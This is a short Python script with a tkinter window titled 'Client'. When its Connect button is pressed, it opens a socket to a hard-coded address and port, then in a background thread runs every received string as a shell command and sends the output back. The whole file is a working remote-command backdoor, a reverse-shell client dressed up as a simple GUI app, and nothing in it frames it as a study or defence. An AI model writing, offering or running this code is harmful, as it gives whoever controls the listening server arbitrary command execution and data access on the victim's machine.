import tkinter as tk
import socket
import subprocess
import threading

def receive_command():
    while True:
        data = conn.recv(1024)
        data = data.decode()
        if data:
            command_text.insert(tk.END, data + '\n')
            # Execute command received from server
            result = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = result.communicate()
            conn.send(result[0])

def connect():
    global conn
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(('192.168.0.102', 9098))
    receive_command_thread = threading.Thread(target=receive_command)
    receive_command_thread.daemon = True
    receive_command_thread.start()

root = tk.Tk()
root.title("Client")

command_text = tk.Text(root, height=10, width=40)
command_text.pack(padx=10, pady=10)

connect_button = tk.Button(root, text="Connect", command=connect)
connect_button.pack()

root.mainloop()
